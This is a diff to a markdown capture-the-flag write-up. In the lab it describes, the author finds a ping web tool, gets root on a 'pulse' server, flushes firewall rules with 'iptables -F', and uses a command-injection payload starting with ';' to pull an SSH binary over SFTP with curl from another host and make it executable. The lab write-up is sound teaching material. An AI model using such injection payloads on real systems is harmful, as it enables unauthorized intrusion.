@@ -4,7 +4,9 @@
 The goal of the CTF was to defuse a bomb by entering a provided code on the defuser website. Initial access was provided to the controller server at https://192.168.20.177.
 
 ## Initial Access and Scanning
-After running an nmap scan and durbuster on 192.168.20.177, I found the "/development" URI. This website provided a text box that says "This bay does one thing: it pings a target and tells you if it’s alive. No extra diagnostics. No noise. Just signal."
+After running an nmap scan and durbuster on 192.168.20.177, I found the "/development" URI. This website provided a text box that says 
+
+> This bay does one thing: it pings a target and tells you if it’s alive. No extra diagnostics. No noise. Just signal.
 
 When you enter something into the text field, it appears to use `/api/ping`, which sends a ping to the specified host and return whether the host is up or down.
 
@@ -161,7 +163,7 @@ As part of my enumeration on the "pulse" server, I found that the defuser server
 
 Cool, so now I have the credentials and the IP address of the defuser host, I just need a way to login. My first thought was to ssh in, however, there was no SSH binary on the pulse target. It appears that it was deliberately removed. Additionally, there was a firewall rule blocking outbound ssh to defuser, but this was easy to get around now that I was root and could run `iptables -F`. 
 
-I learned that curl can act as an SFTP client, and since the defuser had ssh open I could try connecting to it to enumerate and transfer files. Unfortunately, this would not help me get code execution on the remote machine as my credentials were for an unprivileged user that likely couldn't write to crontab, etc. directly. Eventually, I thought, why not just try to transfer the SFTP binary from the defuser to the pulse server.
+I learned that curl can act as an SFTP client, and since the defuser had ssh open I could try connecting to it to enumerate and transfer files. Unfortunately, this would not help me get code execution on the remote machine as my credentials were for an unprivileged user that likely couldn't write to crontab, etc. directly. Eventually, I thought, why not just try to transfer the SSH binary from the defuser to the pulse server.
 
 ```
 ; curl -k -o /tmp/ssh -u admin:admin sftp://10.60.20.74/usr/bin/ssh; chmod +x /tmp/ssh
